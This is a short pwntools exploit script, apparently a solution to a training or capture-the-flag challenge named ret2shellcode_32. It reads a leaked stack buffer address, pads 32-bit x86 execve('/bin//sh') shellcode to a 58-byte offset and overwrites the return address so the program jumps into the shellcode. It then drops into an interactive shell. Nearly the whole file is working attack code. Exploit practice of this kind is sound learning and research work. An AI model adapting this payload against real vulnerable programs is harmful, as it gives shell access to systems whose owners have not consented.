from pwn import *

# context.log_level = "debug"
p = process("./ret2shellcode_32")
# context.terminal=["tmux",'sp','-h']
# gdb.attach(p)

p.recvuntil(b"0x")
buf_add = int(p.recvline()[:-1].decode(),16)
log.success("buf address = {}".format(hex(buf_add)))

offset = 58
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = shellcode.ljust(offset,b"a")+p32(buf_add)

p.sendline(payload)
log.success("pid = {}".format(pidof(p)))
p.interactive()

